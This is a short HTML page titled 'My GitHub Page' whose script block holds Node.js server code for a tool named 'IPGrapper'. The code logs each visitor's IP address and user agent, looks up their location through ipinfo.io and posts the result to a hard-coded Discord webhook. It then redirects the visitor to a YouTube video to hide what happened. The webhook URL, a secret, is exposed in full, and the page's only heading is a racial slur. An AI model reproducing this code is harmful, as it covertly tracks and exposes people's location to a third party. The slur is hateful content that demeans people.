<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My GitHub Page</title>
</head>
<body>
    <script>
        const express = require("express");
const axios = require("axios");
const app = express();

const WEBHOOK_URL = "https://discord.com/api/webhooks/1322202191204974702/IhLr3iOT0jtwbLllFvKEdCLOEy3iDfkCit99B_jCKEute3vqnXN0vaycVWQ0VhfaJjX5";

app.get("/", async (req, res) => {
    const clientIP = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const userAgent = req.headers["user-agent"];

    try {
        const { data } = await axios.get(`https://ipinfo.io/${clientIP}/json`);
        
        const payload = {
            username: "IPGrapper",
            content: `@everyone\n __**UserAgent:**__\n**${userAgent}**\n\n *IP Information:*\n\n${JSON.stringify(data, null, 2)}`
        };
        
        await axios.post(WEBHOOK_URL, payload, { headers: { "Content-Type": "application/json" } });
    } catch (error) {
        console.error("Error fetching IP info or sending webhook:", error);
    }

    res.redirect("https://www.youtube.com/watch?v=SlRug4fhCGE");
});

const PORT = 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

    </script>
    <h1>Nigger</h1>
</body>
</html>
